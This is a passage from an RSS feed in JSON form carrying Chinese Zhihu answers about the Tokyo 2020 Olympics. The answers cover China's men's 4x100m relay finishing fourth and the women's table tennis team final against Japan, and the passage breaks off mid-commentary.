14:33:35","description":"\n<p>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强全程力压牙买加守住优势——37秒79，追平国家纪录（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是决赛第四——甚至跑赢了牙买加！</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"最后一棒的交接，有点可惜了，本来可以更好的。吴的启动节奏啊……\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cc12df8436067a80b7aa7c4bfaa1497b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1730\" data-rawheight=\"662\" data-watermark=\"watermark\" data-original-src=\"v2-cc12df8436067a80b7aa7c4bfaa1497b\" data-watermark-src=\"v2-027efbc8a13cc7bb9489ed8507691e6d\" data-private-watermark-src=\"v2-bf556e669c6d50037239aab16e008b6e\"></p>\n<p><br></p>\n<p>意大利田径队是今夏东京田径赛场上最大的黑马，中国田径队是中国代表队里最让人欣喜的队伍——哪怕他/她们的目标都只是进入决赛、争取名次。</p>\n<p>这些无奖牌的王者，真的是中国体育的骄傲。</p>\n<p><br></p>\n<hr>\n<p>4x100米可以说的点太多了，往详细了说——</p>\n<p><br></p>\n<p>「奥运会是国与国之间无硝烟的战争」这句话让顾拜旦（现代奥运会主要倡导者）听到，估计会气的七窍生烟。但说4x100米接力项目，是国与国之间最强速度的PK，这个描述问题就不大——100米/200米项目都是个体天才间的pk，4x100米这样的接力，就完美体现了最强的速度、最高的默契、最完美的/零容忍的技术要求。</p>\n<p>可能是整届奥运会最紧张刺激的项目（之一）。</p>\n<p><br></p>\n<p><b>25岁的汤星强、27岁的谢震业、32岁的苏炳添、27岁的吴智强，他们代表的中国速度，真的完全不亚于中国其他领域的速度。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1d7c0c20cf2a6f9527ec4580153ae127_720w.jpg?rss\" data-caption=\"预赛小组第一\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-1d7c0c20cf2a6f9527ec4580153ae127\" data-watermark-src=\"v2-e0e1adfea571518903404993c7867568\" data-private-watermark-src=\"v2-9e01dfefb3e5355ab1ac4a6116c6fa05\"></p>\n<h2>\n<br>预赛回顾：超神的小组第一，力压美加意等短跑强国</h2>\n<p><br></p>\n<p>预赛两组。</p>\n<p>第一组牙买加、英国、日本、特立尼达和多巴哥、法国、南非都算是有进入决赛实力的。最终牙买加（37秒82）、英国（38秒02）、日本（38秒16）晋级；</p>\n<p>我们在第二组，<b>汤星强、谢震业、苏炳添、吴智强跑出37秒92，力压加拿大、意大利等强队，第二组排名第一晋级决赛。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9a492c2ad3130c85c9c41014d99bef4f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-9a492c2ad3130c85c9c41014d99bef4f\" data-watermark-src=\"v2-8c663fbabc3df4c1e2df077364365a2c\" data-private-watermark-src=\"v2-5816b498fe42b8087d1814e926432d43\"></p>\n<p><br></p>\n<p>预赛中国队发挥并不算完美，交接棒的一些衔接细节可以做得更好些。</p>\n<p><b>但37秒92本赛季最佳、小组第一晋级的结果，完全不需要吹毛求疵了——汤星强的起跑足够给力、谢震业守住了领先优势、第三棒苏炳添的表现天神下凡生生创造出距离差、而最后一棒吴智强也完全没让加拿大的迫近变成逆转。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-dc1c5483289690ec3852afd8b96a2634_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"460\" data-watermark=\"watermark\" data-original-src=\"v2-dc1c5483289690ec3852afd8b96a2634\" data-watermark-src=\"v2-c74d92a122e191c35f696a0b59d26e4b\" data-private-watermark-src=\"v2-696695d33ae6f77dce93d3fd78229b62\"></p>\n<p><br></p>\n<p>美国出人意料的小组第六（38秒10）、以0.02秒的微弱劣势没能晋级决赛——赛后网上那个小视频估计大家都看到了。<b>苏神问谢震业美国队情况，小谢抿着水摇着手指、一脸坏笑说，“（美国队）没进（决赛），小组第六！”</b></p>\n<p>淘气。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9107901260c9fc86bbca5af8051820d8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2858\" data-rawheight=\"1558\" data-watermark=\"watermark\" data-original-src=\"v2-9107901260c9fc86bbca5af8051820d8\" data-watermark-src=\"v2-93d72687e8eddada5575da9c8fd1894b\" data-private-watermark-src=\"v2-d204d799e6a8348a1fddd0d3cdebc4d8\"></p>\n<p><br></p>\n<p>特别提一下美国队。</p>\n<p>美国的短跑和4x100接力队，自古以来（从1912年奥运设项来）都是全世界第一档的水准——<b>奥运会4x100一共25次（男子）比赛，美国拿了15次冠军、2次亚军。</b></p>\n<p>一度是碾压式的短跑接力梦之队。</p>\n<p>但牙买加崛起后，美国在短跑上就陷入特别尴尬的境地，屡战屡败。上一次拿到金牌已经是悉尼奥运会、过去20多年了。</p>\n<p>2019年多哈世锦赛美国队非常强势夺冠，当时老美全国都有一种被牙买加压迫了那么多年、翻身农奴把歌唱的喜悦。结果东京奥运会科尔曼禁赛、贾斯汀老去，今年短跑美国又表现的很萎靡。</p>\n<p>接力尤其拉胯。</p>\n<p><br></p>\n<p><b>不夸张的说，中国这几年不见得4x100就完全不敢/不该和美国比，相反我们有些年轻人冒起来——这篇内容最后会提到——我们是完全可以掰一掰手腕的。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e0153436b3795cfbf0389763434d0540_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-e0153436b3795cfbf0389763434d0540\" data-watermark-src=\"v2-3a14f9697e583b4154e5ecfb73997e16\" data-private-watermark-src=\"v2-3ecb1c7ff446b38b44c440e5d9607a7e\"></p>\n<p><br></p>\n<p>就事论事，再多说一下预赛的分组。</p>\n<p>之前接力分组出来后，有声音说日本把自己分在弱组，把中国放进死亡组。这种争议有点没有必要。</p>\n<p>一来日本自身不弱，二来接力谈不上多少能放水的（除非最后一棒大幅领先），和强队一组反而能跑得更快，且日本那组真的不弱。就算拿不到前三也能靠更快成绩进决赛。</p>\n<p><br></p>\n<p>这样进入决赛的八支接力队，按半决赛成绩依次是，牙买加、中国、加拿大、意大利、英国、德国、加纳、日本。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2e702ed1f0628514393a7200b2a488cf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1656\" data-rawheight=\"656\" data-watermark=\"watermark\" data-original-src=\"v2-2e702ed1f0628514393a7200b2a488cf\" data-watermark-src=\"v2-6c7690b425761c5d28e1aca802f1f203\" data-private-watermark-src=\"v2-38ae798a7e3ae668d3a91093f2ddb3f4\"></p>\n<p><br></p>\n<h2>决赛：再次第四，追平国家纪录！</h2>\n<p>中国第七道。</p>\n<p>第七道是不错的道次，两边一个是接力老牌强队英国，一个是今年让人刮目相看的意大利（横空出世，确实很多人都没想到）。小日本最外道。</p>\n<p>汤星强、谢震业、苏炳添、吴智强，四人出场的亮相是小悟空爆气的动作。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a3ae3c0efb10e325d01dcd7752e6f366_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"337\" data-watermark=\"watermark\" data-original-src=\"v2-a3ae3c0efb10e325d01dcd7752e6f366\" data-watermark-src=\"v2-c287f38bb92511f344319424efa2211f\" data-private-watermark-src=\"v2-e203a5710cd66aaa1765cae0c42d199f\"></p>\n<p><br></p>\n<p>比赛开始。</p>\n<p>汤星强0.153秒起跑反应，位列第5。从起跑到加速这一段相比其它选手没有什么优势（毕竟决赛第一道就没弱的），不过<b>在完成加速-进入最高速度时，维持极速相当不错。交接棒之前缩小了一些和洛伦佐（意大利）的差距</b>；</p>\n<p>第二棒给到谢震业后，小谢的过渡也是相当顺利的。而老对手日本队，可能过于兴奋/紧张，居然掉棒了……</p>\n<p>第三棒的苏炳添，自然是最强的 （<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" class=\"internal\">为什么苏炳添4*100米跑第三棒弯道？</a> ）。<b>苏炳添在英国队的外道，和同是老将的理查德·基尔蒂直接PK，死死咬住，几乎抹平了差距</b>；</p>\n<p>最后一棒吴智强是<b>惋惜后的惊喜</b>。</p>\n<p><b>吴智强的启动有点儿可惜，交接棒的启动节奏早了……甚至可能感觉出苏炳添的一丝懊恼。本来3-4棒交接这段，中国完全有可能追平英国、微超意大利。</b></p>\n<p><b>但这种可惜很快又变成一种惊喜，吴智强死死的压住了奥布利克·塞维尔（20岁的小将，百米尚未跑进10秒），将这种微弱领先保持住了。</b></p>\n<p><br></p>\n<p>意大利（菲利帕）和英国（米切尔·布莱克）的冲刺相当优秀，也决定了最终的名次。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><br></p>\n<p><b>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强有小失误不过后面全程力压牙买加——37秒79，追平国家纪录</b>（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是<b>决赛第四</b>——甚至跑赢了牙买加（0.05秒）！</p>\n<p>只落后铜牌加拿大0.09秒，加拿大的个体实力很高，交接棒技术只能算一般。而交接棒技术一直是世界最佳的日本和牙买加，今天却纷纷表现的非常业余。</p>\n<p><br></p>\n<p>中国队的表现，则真的相当出色。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d722048f4604475aef1050167d39e5bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-d722048f4604475aef1050167d39e5bc\" data-watermark-src=\"v2-7aeffd36c220ae50780d0d19b348b859\" data-private-watermark-src=\"v2-5753474e589fdf5b0db175f5aa766aa9\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-24b15adc47f6843c25336f7f79d3671f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-24b15adc47f6843c25336f7f79d3671f\" data-watermark-src=\"v2-49c4619611736d0b0343eaa0480c1741\" data-private-watermark-src=\"v2-d7b09e5140b397722702f5877c6bf862\"></p>\n<h2>\n<br>中国短跑接力队的昨天、今天和明天</h2>\n<p>太远古时期不提。<b>近年中国短跑和短跑接力兴起，也就是11、12年左右的事，正好十年前苏炳添、张培萌这一代起来。</b></p>\n<p>中国田径队前总教练冯树勇几年前说过一段话，大意是<b>中国接力队此前从上到下都“干劲不足”，大家抱着“人人弱则团体更弱”的心态。结果隔壁日本起了好榜样，4个百米都没破过十的选手，接力队却能和欧美扳手腕，于是从近邻身上得到信心，才有了后面几年可圈可点的成绩。</b></p>\n<p><br></p>\n<p>感兴趣可以看看这个回答，提到不少以前几支接力队：</p>\n<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-0d638eaf077707b53a0867e157bc41fd_bh.jpg\" data-image-width=\"2252\" data-image-height=\"836\" class=\"internal\">4x100米接力，为什么苏炳添会跑第三棒弯道？</a><p><br></p>\n<p>2016年，苏炳添接受采访时曾提到这样一句话，“<b>希望中国能多出几个百米跑到10秒20的年轻选手，这样中国接力队才能继续保持竞争力。</b>”当时铁打的最后一棒张培萌已近退役，苏炳添自己也快30。</p>\n<p>2015年北京世锦赛拿到银牌后，很多人就已经担心那支中国接力队已达到上限、很怕后继无人。</p>\n<p>然而这两年中国短跑很神奇的涌现出一大批很值得期待的年轻人。比如“00后”的<b>陈冠锋</b>（10秒06）、<b>何宇鸿</b>（10秒18）、<b>黄永炼</b>（10秒31）、<b>严海滨</b>（10秒22），以及禤达军、王智弘、陈程、李文杰……</p>\n<p><br></p>\n<p>其中比如严海滨，是2003年出生的小将，今年东京奥运会已经是接力队的替补了（这小伙100和200米都有很强竞争力）。还有今年屡次刷新个人最快的陈冠锋、去年刷新34年历史全国青年百米纪录的何宇鸿，<b>不少都已经比苏炳添们同龄时期表现的更为出色</b>。</p>\n<p>后生可畏。</p>\n<p>记住这些年轻的名字吧。</p>\n<p><b>兴许以他们的年龄和实力，在东京奥运会周期还无法挑大梁，不过明年的亚运会和世锦赛、包括三年后的巴黎奥运会，他们兴许就能慢慢接过苏炳添的旗帜。</b></p>\n<p>毕竟届时苏神已经35岁了。</p>\n<p>再加上梁劲生等依然还在当打年的“老将”（很可惜，今年4月底梁劲生拉伤，不然东京很有可能看到他），<b>中国接力队未来几年完全具备成为世界强队的可能。</b></p>\n<p><br></p>\n<p>至于这个上限是多少，比较现实的，</p>\n<ul>\n<li>稳定发挥确保进入决赛、赢下与老对手日本队「亚洲一哥」的较量、冲击前五甚至领奖台的名次；</li>\n<li>用交接棒的技术默契度弥补个体上的差异，用完善的青少年田径梯队人才去抗衡日本卡塔尔等存在的归化/混血军团（比如日本之前的萨尼·布朗）；</li>\n<li>也别像美国、特立尼达和多巴哥们一样，经常动不动交接棒环节拉胯、用低级失误白白浪费天赋；</li>\n</ul>\n<p><br></p>\n<p>另外最近20年，牙买加、美国、英国等接力强队都在药物问题上出现过问题，有隔了快十年成绩被作废、奖牌回收的黑历史——干干净净的跑，干干净净的赢。起码现在看，中国短跑国家队在这点上做得挺不错的。</p>\n<p><br></p>\n<p>继续加油，中国接力队！</p>\n<p>（通篇提的都是中国短跑接力男队，后面有时间再说说女队，同样是好样的）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-90a3e13851db76792d718804d9adee7f_720w.jpg?rss\" data-caption=\"最后一棒吴智强有遗憾有惊喜\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-90a3e13851db76792d718804d9adee7f\" data-watermark-src=\"v2-7d486b756e0ad33bd077e2037ebb5f47\" data-private-watermark-src=\"v2-c48799b733b3417771b12b432ba9b796\"></p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">361 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/476382083?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运田径女子组100米决赛？</a><br><a href=\"http://www.zhihu.com/question/476457735?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会女子 4x100 米混合泳接力决赛中国队获第 4 ？</a><br>\n","link":"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2020 东京奥运乒乓球女团中国 3:0 完胜日本夺冠，如何评价本场比赛？","date":"2021-08-05 12:52:48","description":"\n<p><b>恭喜中国队3比0战胜日本！</b></p>\n<p>本届奥运会，中日女子选手仅在女单半决赛上交锋一次，即为经典的孙颖莎伊藤之战：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p>中方的陈梦、孙颖莎、王曼昱三位大将，对日本大姐大伊藤的胜率均是极高的。孙颖莎更是刚刚4比0取胜，对于队友的士气是极大鼓舞。平野虽曾17年表现极其亮眼，但自从被国乒研究后，反手长下旋被盯死，后来一直便没有特别出色的战绩。然而，这是日本的主场，且国乒被其研究了许久。伊藤和平野的打法比较看状态，要防止爆发的可能。这次终于在决赛上相遇，尚有不小的悬念。希望中国队可以迅速取胜，消除任何小概率事件发生的土壤。</p>\n<hr>\n<h2>第一场 双打</h2>\n<p>第一场双打，陈梦/王曼昱对战石川/平野。伊藤留作生力军打单打了。日方上来几回合内就锁了个两个直线，对中国队的习惯、跑位是有较深的研究的。日方选手一个左手一个右手，相比中国两个右手还是有一定跑位优势。</p>\n<p>石川打得很凶，能反拉就反拉，能近台加力快带就快带。局初段我方不太适应，速度有点跟不上，再加上日本有两个运气球，比分到了局中有点落后。日本的配合、线路目前而言要比我方强上一些。</p>\n<p>第一局中后段，日方吃了两个发球。再加上我方抡出了几个质量，实力球还是比日方功底深厚，比分一度扳至八平。然而，日方的线路优势再次发挥作用，连续的正手锁直线，把中方攻得有些措手不及。之后虽我方追上一分，但其后仍被逼到远台，尝试反攻失分。</p>\n<p>我方第一局打得还是有点拘谨，起板的落点也没拉开。这样被对方一左一右调动得太被动，质量优势就显现不出来了。看看第二局换发球接发球轮以后会不会有改观，中国队也需要适应对手的时间。</p>\n<p>偶数局上来似乎中国队明显要舒服一些，平野的综合实力相比石川还是差些，中方能给出更多质量来。虽然石川0比4落后时有一个精彩的侧身爆冲，但并不能挽回下风的气势。见形势大比分落后，再加上本轮次日方限制线路的打法不奏效，接发球也出了不少问题，日本队全部搏杀（且成功率不高，因为不是计划内的战术），速败。关键还是要看第三局，现在的气势我方占优。</p>\n<p>平野的发球我们还是吃了一点的，在下一个轮次尤其要注意。不过王曼昱主要是拧拉为主，吃发球的几率不大，但是回球的落点一定要多想想。陈梦的质量也一定要出得来。</p>\n<p>第三局开始。日本基本的战术还是先锁直线/平野挑大斜线，锁住中国队的正手位，随后再调动回反手位。如此一来，由于中国队是双右手组合，就很容易挤压在一起。王曼昱接发的拧拉还是基本回在对方中路上，如果能多些变化就更好了。</p>\n<p>2比4时是中国队的好球，石川的打法还是比较拼，积极用正手时反手位露出了空当。可以多考虑从这里做文章。5比6时的那球也非常好，一定不能像前面几回合那样送中路，多给点反手，多给点重复落点。对面虽是一左一右，但武器库都不完善，想要拼中国队都需要舍近求远，还是有机会能挤压住对方空间的。</p>\n<p>七平时的回合中国队落点给得非常好，多板对拉后拿下很长气势，本可以成为关键节点，但随后日本就是一个运气球得分。笔者仍感到微微担忧，前途未卜。好在国乒二位在八平后又来了一个对拉得分，打得超出了石川的能力范围，随后一鼓作气拿下本局。</p>\n<p>第三局实在是太关键了…好在中国队成功咬了下来。接下来一定要乘胜追击拿下。有个比较有趣的事在于，陈王二位发球前的沟通，是不是应该稍微小声点…石川和平野应该都能听懂（</p>\n<p>第四局第一个回合平野的反手上手就开始加质量，石川也增强了搏杀力度。中国队有所失误，但力量占据优势，双方战至小分3比3仍是僵持状态。日方的短球还是有所欠缺的，力量也不占优，3比5落后之后叫了暂停。暂停结束后，日方挑打失误，随后又被中国队抢先上手，比分拉开了不小。本局日方的多数得分点还是在控制我方的正手上，又是连续两个锁直线送我们正手的得分了。</p>\n<p>日本5比8落后时，石川反手反拉的完美落点得分，把日本队的气势又带出来了。随后是石川的抢攻套路得分，目前中日仅一分之差。王曼昱的反手在此时发挥了极大作用，力量大，速度快，最后更是一板拧拉一击致命，抢下了第一场双打。</p>\n<p>这场双打对我们太珍贵了。孙颖莎对伊藤并非必胜，日本这次的冲击力是很大的。中国队开了个好头。</p>\n<hr>\n<h2>第二场 孙颖莎 vs 伊藤</h2>\n<p>孙颖莎再战伊藤，刺激。</p>\n<p>第一局以生胶的慢热，孙颖莎是需要拿下的。开局领先，伊藤反手还没什么球，侧剌之类的很少上台，正手也有失误。但孙颖莎还是吃了发球的，这一点需要注意。</p>\n<p>先不论输赢，有一点是中国队的进步，也是信心的提升，那就是孙颖莎完全不怕接发球劈长后与伊藤对反手了。伊藤也明白这一点，在局中段积极求变，反而多去送孙颖莎的正手及中路偏正手。孙颖莎反倒不太舒服，尤其是六平那一球，生胶球送到这个位置的轨迹孙颖莎不太适应。</p>\n<p>有点在跟着伊藤的节奏走。孙颖莎还是要再把节奏放慢点，质量要出得来。比如7比8的那球就很好，多等一个点，质量再提高一点。今天伊藤的打法有所变化，没有完全扑在台子上，孙颖莎也要适时进行调整。</p>\n<p>非常好，孙颖莎的节奏慢下来了。伊藤站在偏中台的位置，不再以快取胜，而是节奏变化加上颗粒的怪。但孙颖莎只要盯住了把质量加上去，哪怕稍微慢一点，也是不怕伊藤拍弧圈的。事实上，伊藤目前为止的打法就不是近台拍。果然采取更合理的战术后，孙颖莎连下四分，夺下第一局。</p>\n<p>第二局似乎伊藤打算变招了，回到老战术，速度极快。不论哪种打法，伊藤都是有相当大的威胁的。孙颖莎如果质量出得来，打得还是非常顺手，但伊藤的起板盯住孙颖莎的反手大斜线以及中路偏正手，还是有点难受。双方拉锯至五平。</p>\n<p>伊藤与孙颖莎进入持续反手相持，孙颖莎的反手状态不错，摩擦感觉很好，持续把颗粒回的下沉球挂住，并寻隙加力至伊藤反手大角得分。伊藤对自己的反手不太自信，心态受到了影响，发球失误。教练赶紧叫暂停。</p>\n<p>居然还把伊藤发球失误做成慢动作回放hhh这个编导有点腹黑（</p>\n<p>暂停结束，孙颖莎反手质量依旧可圈可点，前三板的计算也比伊藤更精良，起板快，线路好，发球伊藤也还没掌握规律。孙颖莎迅速拿下第二局，形势很不错。</p>\n<p>伊藤从单打半决赛开始就吃孙颖莎的中路发球，现在还吃，日本队这届教练不行啊…</p>\n<p>第三局第一回合，伊藤的线路无可挑剔。但就像马龙对樊振东的决赛，樊振东的线路很好，但马龙就是更胜一筹。孙颖莎的线路显得更加刁钻，气势极盛。不过紧接着吃了个不转发球，士气受了影响，后面又吃了一个。</p>\n<p>前两局里孙颖莎严格意义上来说，也有些吃发球，但只要劈到了底线，倒也不怕伊藤起板相持。这局的几个吃发球不同，要么出界，要么台内冒得老高，就完全没有周旋的余地了。伊藤这局的正反手状态均非常好，零失误。8比2领先时更是上演了一个瞎拍神球。不知孙颖莎是会复现半决赛第二局的逆转，还是会战略性先放掉一局。</p>\n<p>孙颖莎这局没什么出手的机会，伊藤的状态开始出来了，值得警惕。孙颖莎吃伊藤的不转吃了非常多个，笔者粗略数数就起码有三个。还是要咬住，质量要加上去。线路也要多想想，接发球送反手太多了也容易被算住。</p>\n<p>第四局孙颖莎上来有点小宇宙爆发的意思了，质量非常高，伊藤几乎没有还手之力。后面伴随着孙颖莎的两个运气球、伊藤的机会球失误、孙颖莎的完美接发，比分迅速拉开，孙颖莎7比2领先。但接下来伊藤扳回一分，告诉孙颖莎自己相持的状态仍在。孙颖莎再次劈长擦边，又是一个运气球，伊藤已经哭笑不得了。</p>\n<p>孙颖莎得理不饶人，正反手全力施为，力量拉满，穿直线、反手爆拉侧切，直接把伊藤的花样全部破掉，11比3取得胜利，中国队大分2比0领先日本。</p>\n<p>本场比赛，伊藤第一二局的战术变化可圈可点，给孙颖莎造成了一定的不适应。团体五局三胜，节奏快，易爆冷，孙颖莎输了一局是有较大压力的。好在孙颖莎顶住压力，后半盘更是顺风拿下，奥运赛场连续两次战胜伊藤，基本已锁定了24巴黎的单打名额。</p>\n<hr>\n<h2>第三场 王曼昱 vs 平野</h2>\n<p>本次奥运国乒启用p卡，换王曼昱上场。固然有刘诗雯伤病缘故，自然也有培养新生代之意。王曼昱实力自然比平野强不少，尤其自17年国乒对平野深入研究后。笔者记得那时平野和国乒多人都碰过了，大家都拿一个打法打她——送反手、中路长，不管是发球还是接发劈长，但她就是摆脱不了（</p>\n<p>开局平野速度很快，这也是她的特长。王曼昱作为实力占优的一方，千万不要跟着以快打快，否则动作不到位，高速相持中就容易下网失误。王曼昱身高臂长，一定要把速度慢下来，质量加上去。王曼昱也确实是这么做的，很顺利就拿下第一局。</p>\n<p>第二局王曼昱上来就全面占优，逼日本叫了暂停。这个暂停叫得好，把王曼昱火热的状态叫没了。一个台内轻挑直线，一个反手起板，一个扑在近台的摆速得分，平野扳回局势。中间王曼昱的劈长思路还是对的，但那球旋转还没加上去，没送到平野的弱点上。王曼昱还是要多加旋转上去，要劈长就剁下去，要上手就像双打最后几球一样，把质量都打出来，平野的速度就被限制了。比如王曼昱4比7落后的那个劈长，做得就比前半段的好。</p>\n<p>看来这个劈长是王曼昱想明白后状态回暖的关键点，王曼昱一路追分至七平，但在八平后还是被平野套路了一个线路，到关键球了。下一回合虽然勉力撑住得分，但还是很被动，让人心惊肉跳。</p>\n<p>九平，王曼昱手握两个发球。平野的正手落点到了正手小三角，速度位置都近乎完美。但王曼昱拥有力量优势，身高臂长，护台极广，硬是直接步法到位快带回来。平野扛不住质量，回防出现机会，被王曼昱穿直线直接得分。这一球太精彩了，平野打到那个落点估计认为自己已经有了。这一分拿下，基本这局已经很上风。果然王曼昱紧接着在相持中稳住，而平野急于拉穿失分，王曼昱逆转第二局！</p>\n<p><img 